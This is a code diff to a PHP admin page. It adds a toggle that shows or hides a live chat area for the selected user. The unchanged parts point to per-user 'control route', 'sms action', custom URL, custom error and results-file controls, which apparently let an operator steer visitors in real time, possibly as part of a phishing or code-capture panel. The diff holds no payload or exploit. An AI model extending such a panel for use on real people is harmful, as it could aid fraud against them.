@@ -152,7 +152,7 @@ $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 
             </div>
             <div class="card" style="margin-top:12px">
                 <h3>Live Chat</h3>
-                <div class="row"><label><input type="checkbox" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled'])?'checked':''; ?>> Enable chat for selected user</label></div>
+                <div class="row"><label><input type="checkbox" id="chat-enabled-toggle" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled'])?'checked':''; ?>> Enable chat for selected user</label></div>
                 <div class="meta" style="margin-bottom:10px">Chats are isolated per user ID. You can reply to multiple users below without switching pages.</div>
                 <div id="multi-chat-container"></div>
             </div>
@@ -175,6 +175,7 @@ const instructionField = document.getElementById('instruction');
 const customUrlRow = document.getElementById('custom-url-row');
 const customErrorRow = document.getElementById('custom-error-row');
 const customUrlField = document.getElementById('custom_url');
+const chatEnabledToggle = document.getElementById('chat-enabled-toggle');
 
 function escapeHtml(value){
     return String(value || '').replace(/[&<>"']/g, (ch) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[ch]));
@@ -237,10 +238,12 @@ function renderChatCard(user){
         card.style.marginBottom = '10px';
         card.innerHTML = `
             <h4 style="margin:0 0 8px 0">${escapeHtml(user.name || 'Unknown')} <span class="meta">(${escapeHtml(user.id)})</span></h4>
-            <div class="chat-box" data-role="chat-box"><div class="meta">Loading...</div></div>
             <div class="meta" data-role="chat-status" style="margin-top:8px"></div>
-            <div class="row" style="margin-top:8px"><textarea class="chat-input-wide" data-role="chat-input" placeholder="Write your message"></textarea></div>
-            <button type="button" data-role="chat-send">Send</button>
+            <div data-role="chat-content">
+                <div class="chat-box" data-role="chat-box"><div class="meta">Loading...</div></div>
+                <div class="row" data-role="chat-input-row" style="margin-top:8px"><textarea class="chat-input-wide" data-role="chat-input" placeholder="Write your message"></textarea></div>
+                <button type="button" data-role="chat-send">Send</button>
+            </div>
         `;
         multiChatContainer.appendChild(card);
 
@@ -279,12 +282,16 @@ function setChatEnabled(userId, enabled){
     const card = document.getElementById(chatCardId(userId));
     if (!card) return;
     const status = card.querySelector('[data-role="chat-status"]');
+    const content = card.querySelector('[data-role="chat-content"]');
     const input = card.querySelector('[data-role="chat-input"]');
     const send = card.querySelector('[data-role="chat-send"]');
+    if (content) {
+        content.style.display = enabled ? '' : 'none';
+    }
     if (input) input.disabled = !enabled;
     if (send) send.disabled = !enabled;
     if (status) {
-        status.textContent = enabled ? 'Chat is enabled for this user.' : 'Chat disabled. Enable chat from control form to send new messages.';
+        status.textContent = enabled ? 'Chat is enabled for this user.' : 'Chat disabled. Enable chat for selected user to show messages and reply box.';
     }
 }
 
@@ -302,6 +309,21 @@ async function fetchChatForUser(userId){
 async function fetchAllChats(){
     for (const user of allUsers) {
         fetchChatForUser(user.id);
+    }
+}
+
+function updateSelectedChatVisibility(){
+    if (!multiChatContainer || !selectedUserId) return;
+    const selectedCard = document.getElementById(chatCardId(selectedUserId));
+    if (!selectedCard) return;
+    const enabled = chatEnabledToggle ? chatEnabledToggle.checked : false;
+    const content = selectedCard.querySelector('[data-role="chat-content"]');
+    const status = selectedCard.querySelector('[data-role="chat-status"]');
+    if (content) {
+        content.style.display = enabled ? '' : 'none';
+    }
+    if (status && !enabled) {
+        status.textContent = 'Chat area is hidden. Enable chat for selected user then click Apply Update.';
     }
 }
 
@@ -334,11 +356,15 @@ if (multiChatContainer) {
         }
     }
     fetchAllChats();
+    updateSelectedChatVisibility();
     setInterval(fetchAllChats, 1000);
 }
 
+if (chatEnabledToggle) {
+    chatEnabledToggle.addEventListener('change', updateSelectedChatVisibility);
+}
 if(controlRoute){controlRoute.addEventListener('change',syncControlState);} if(smsAction){smsAction.addEventListener('change',syncControlState);} syncControlState();
-if(smsForm){smsForm.addEventListener('submit',async(e)=>{e.preventDefault();syncControlState();const formData=new FormData(smsForm);formData.append('ajax','update_sms');const res=await fetch('admin.php',{method:'POST',body:formData});const data=await res.json();flashMessage.style.display='block';flashMessage.classList.toggle('error',!data.success);flashMessage.textContent=data.message||'Update failed.';if (selectedUserId) {fetchChatForUser(selectedUserId);} });}
+if(smsForm){smsForm.addEventListener('submit',async(e)=>{e.preventDefault();syncControlState();const formData=new FormData(smsForm);formData.append('ajax','update_sms');const res=await fetch('admin.php',{method:'POST',body:formData});const data=await res.json();flashMessage.style.display='block';flashMessage.classList.toggle('error',!data.success);flashMessage.textContent=data.message||'Update failed.';if (selectedUserId) {fetchChatForUser(selectedUserId);} if (chatEnabledToggle && data.state) {chatEnabledToggle.checked = !!data.state.chat_enabled;} updateSelectedChatVisibility();});}
 </script>
 </body>
 </html>
